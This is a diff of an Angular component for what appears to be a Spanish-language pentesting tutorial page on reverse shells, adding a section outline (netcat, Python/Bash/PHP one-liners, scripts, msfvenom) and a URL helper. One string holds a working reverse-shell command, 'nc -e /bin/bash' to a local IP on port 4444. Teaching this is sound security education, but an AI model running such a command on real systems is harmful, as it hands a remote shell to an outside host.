@@ -1,21 +1,53 @@
-import { Component } from '@angular/core';
+import { Component, AfterViewInit, OnInit } from '@angular/core';
 import { Title } from '@angular/platform-browser';
+import { Location } from '@angular/common';
+import Prism from 'prismjs';
 import { Router, NavigationEnd } from '@angular/router';
-
+interface Section {
+  label: string;
+  subSections?: Section[];
+}
 @Component({
   selector: 'app-rever-shell',
   templateUrl: './rever-shell.component.html',
   styleUrl: './rever-shell.component.css'
 })
 export class ReverShellComponent {
-  constructor(private titleService: Title, private router: Router) {
+  constructor(private titleService: Title, private router: Router, private location: Location) {
     this.router.events.subscribe((event) => {
       if (event instanceof NavigationEnd) {
         window.scrollTo(0, 0); // Scrolls to the top of the page
       }
     });
   }
-
+  sections: Section[] = [
+    { label: 'Que es una rever',
+    subSections: [
+      { label: 'Como conseguir una rever',
+      subSections: [
+        { label: 'Rever basica con Netcat' },
+        { label: 'Preparacion para la rever' },
+      ],
+       },
+       { label: 'One-Liner',
+       subSections: [
+        { label: 'Python' },
+        { label: 'Bash' },
+        { label: 'PHP' },
+      ]},
+      { label: 'Scripts',
+       subSections: [
+        { label: 'Python' },
+        { label: 'PHP' },
+      ]},
+      { label: 'Msfvenom',
+       subSections: [
+        { label: 'Python' },
+        { label: 'PHP' },
+      ]}
+    ]
+     }
+  ];
   pageTitle: string = '';
   nc:  string = `nc -e /bin/bash 192.168.1.134 4444`;
   which:  string = `which python`;
@@ -39,4 +71,9 @@ export class ReverShellComponent {
       window.getSelection()?.removeAllRanges();
     }
   }
+  generateURL(label: string): string {
+    const basePath = this.location.prepareExternalUrl('');
+    return `${basePath}revershell#${label}`;
+  }
+
 }
